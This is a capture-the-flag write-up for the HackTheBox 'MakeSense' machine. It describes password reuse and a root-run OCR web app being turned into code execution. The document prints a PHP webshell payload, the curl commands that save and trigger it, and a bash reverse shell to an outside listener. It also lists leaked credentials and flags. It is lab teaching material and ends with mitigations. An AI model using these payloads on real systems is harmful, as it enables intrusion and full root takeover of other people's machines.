# MakeSense — HackTheBox Writeup

<p align="center">
  <img src="makesense-logo.png" alt="MakeSense machine logo" width="200">
</p>

**OS:** Linux
**Target:** `makesense.htb` (10.129.29.80 / 10.129.29.31 during recon)

---

## Attack Path Overview

```
Recon (WordPress + custom theme)
   → Leaked DB credentials via wp-config.php (www-data foothold)
   → Password reuse: walter's WP-config password = SSH password = OCR app Basic Auth
   → Root-owned internal OCR web app on 127.0.0.1:8001 (php -S, saves OCR text to webroot)
   → Image-based PHP webshell via OCR "save output as file" feature
   → Code execution as root → reverse shell → root.txt
```

---

## 1. Reconnaissance

Initial nmap scan of the box:

```
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
80/tcp   filtered http
443/tcp  open     ssl/https   Apache/2.4.58 (Ubuntu)
8001/tcp filtered vcom-tunnel
```

The HTTPS vhost resolves to `makesense.htb`, a WordPress site running a custom theme (`webagency`) with an AI-powered "voice call" feature built on Transformers.js (client-side Whisper transcription + summarization).

### Interesting theme JS

Reviewing `main.js` / `whisper-wrapper.js` revealed:

- A hardcoded AES-GCM encryption key shipped to every visitor:
  ```
  ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'
  ```
- An `applySymbolMapping()` function that maps spoken phrases (`"open bracket"`, `"slash"`, etc.) to literal symbols (`<`, `/`) — explicitly commented as being intended `for XSS injection`, since transcribed voice text feeds into a stored message.
- Two AJAX actions: `save_voice_raw` (upload raw audio, get a `post_id`) and `save_voice_results` (upload an **encrypted** `{transcription, summary}` payload). Both transcription and encryption happen entirely **client-side**, meaning the server trusts whatever encrypted blob it receives — and since the key is exposed in the client JS, an attacker can forge that blob directly, skipping the audio/Whisper pipeline entirely.

This was pursued as a potential stored-XSS path against an admin viewing voice messages, but the actual foothold ended up coming through a different, more direct route (WordPress database access via an existing low-priv shell) — see below.

---

## 2. Foothold

With a `www-data` level shell obtained (via the WordPress attack surface), `wp-config.php` was reviewed:

```php
define( 'DB_DIR', __DIR__ . '/wp-content/database/' );
define( 'DB_FILE', '.ht.sqlite' );
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
define( 'DB_HOST', 'localhost' );
```

Interestingly, the site actually runs on **SQLite**, not MySQL — this credential block is a leftover/unused artifact, but the password itself turned out to be reused elsewhere on the system.

The WordPress SQLite database was queried directly:

```bash
sqlite3 /var/www/html/wp-content/database/.ht.sqlite
sqlite> select * from wp_users;
```

This returned three accounts (`admin`, `walter`, `jake`) with WordPress's newer `$wp$2y$...` bcrypt-style hashes (crackable after normalizing the prefix back to `$2y$` for hashcat/john, if needed).

### Credential reuse

The `walter` password found in `wp-config.php` (`JbhHDAEgXvri3!`) was tried directly against SSH:

```bash
ssh walter@makesense.htb
```

This succeeded, granting a full interactive shell as `walter` and `user.txt`.

> **Note:** The initial SSH attempt hung indefinitely during key exchange. Debugging with `ssh -vvv` showed the negotiated KEX algorithm was `sntrup761x25519-sha512@openssh.com` (a post-quantum hybrid), which stalled at `SSH2_MSG_KEX_ECDH_REPLY` — consistent with MTU/fragmentation issues over the HTB VPN tunnel for the larger PQ handshake packets. Forcing a classic algorithm resolved it:
> ```bash
> ssh -o KexAlgorithms=curve25519-sha256 walter@10.129.29.80
> ```

---

## 3. Privilege Escalation

### Enumeration

As `walter`:

```bash
sudo -l          # No sudo rights
find / -perm -4000 -type f 2>/dev/null   # Nothing unusual
ps aux | grep root
```

The process list revealed a root-owned internal web service bound only to loopback:

```
root  1397  php -S 127.0.0.1:8001 -t /root/ocr4/
```

### Reaching the internal service

Since `walter` has a local shell on the box, `127.0.0.1:8001` was directly reachable without needing a tunnel:

```bash
curl -s http://127.0.0.1:8001/
# Authentication required. (HTTP Basic Auth)
```

Password reuse struck again — the same `walter:JbhHDAEgXvri3!` credential worked for the Basic Auth prompt:

```bash
curl -s -u walter:'JbhHDAEgXvri3!' http://127.0.0.1:8001/
```

### The "MakeSense" OCR app

The app ("MakeSense") is a canvas-based OCR tool: draw text, submit it, get the recognized text back, and optionally save that output to a file under a session-bound `ocr_id`.

- The `filename` field is **not vulnerable to path traversal** — the app strips path components and always writes inside a `saved/` directory relative to its own webroot (`/root/ocr4/saved/`).
- However, that `saved/` directory is served live by the same `php -S` instance — running as **root**. Anything saved there as a `.php` file gets executed as root on request.

### Crafting the payload

Since OCR accuracy on code syntax is unreliable (small glyphs like `d`/`a`, `]`/`}` get misread), the payload image was rendered carefully using ImageMagick with a bold monospace font and extra kerning to maximize OCR accuracy:

```bash
convert -size 1400x150 -background white -fill black \
  -font "DejaVu-Sans-Mono-Bold" -pointsize 36 -kerning 3 -gravity center \
  label:'<?php system($_GET["cmd"]);' shell.png

base64 -w0 shell.png > shell_b64.txt
```

### Submitting and saving

```bash
# 1. OCR the image
curl -u walter:'JbhHDAEgXvri3!' -c cookies.txt -b cookies.txt -X POST http://127.0.0.1:8001/ \
  --data-urlencode "canvas_image=data:image/png;base64,$(cat shell_b64.txt)" \
  -o ocr_result.html

# 2. Extract the session-bound OCR id
SHELLID=$(grep -oP 'name="ocr_id" value="\K[^"]+' ocr_result.html)

# 3. Save the recognized text as a .php file inside the webroot
curl -u walter:'JbhHDAEgXvri3!' -c cookies.txt -b cookies.txt -X POST http://127.0.0.1:8001/ \
  --data-urlencode "ocr_id=$SHELLID" \
  --data-urlencode "filename=shell.php" \
  --data-urlencode "save_output=Save" \
  -o save_result.html
# -> "Saved as: saved/rshell2.php"
```

> Note: the app renames/deduplicates filenames on save (e.g. `shell.php` → `rshell2.php`), so the actual saved path must be read back from the response rather than assumed.

### Triggering root code execution

```bash
curl -u walter:'JbhHDAEgXvri3!' "http://127.0.0.1:8001/saved/rshell2.php?cmd=id"
# uid=0(root) gid=0(root) groups=0(root)
```

Confirmed root-level command execution through the webshell. A full reverse shell was then triggered:

```bash
# listener on attacking machine
nc -lvnp 4444

# trigger
curl -u walter:'JbhHDAEgXvri3!' -G "http://127.0.0.1:8001/saved/rshell2.php" \
  --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.115/4444 0>&1"'
```

```bash
root@makesense:~# cat root.txt
b39424142c714119f3bdd115a7e9c35e
```

---

## Flags

| Flag | Value |
|---|---|
| user.txt | `702d8d792664e26efbfe54a9693ba7d0` |
| root.txt | `b39424142c714119f3bdd115a7e9c35e` |

---

## Proof

<p align="center">
  <img src="images/solved.png" alt="MakeSense solved confirmation" width="600">
</p>

---

## Key Takeaways & Mitigations

1. **Never ship encryption keys in client-side code.** The Whisper "voice message" feature's AES key was fully exposed in JS, letting anyone forge arbitrary "transcription" content server-side without any real audio or transcription pipeline.
2. **Don't leave unused credential blocks with real passwords in config files.** The `DB_PASSWORD` in `wp-config.php` was irrelevant to the actual SQLite-backed WordPress install, but the password was reused for a real system account (`walter`) — an unnecessary and dangerous overlap.
3. **Eliminate password reuse across services.** The same credential worked for SSH and for a separate internal web app's Basic Auth — one leaked credential compromised multiple attack surfaces.
4. **Don't run internal admin/dev tools as root**, especially ones that write attacker-influenced content (OCR output) into a directory served by the same web server. Any "save to file" feature inside a web-served directory is a direct path to RCE if the file extension isn't restricted and the process runs with elevated privileges.
5. **Restrict file extensions on any user-controlled "save output" feature** — at minimum, disallow `.php`/executable extensions, and ideally serve saved output from a non-executable, separate storage location entirely.
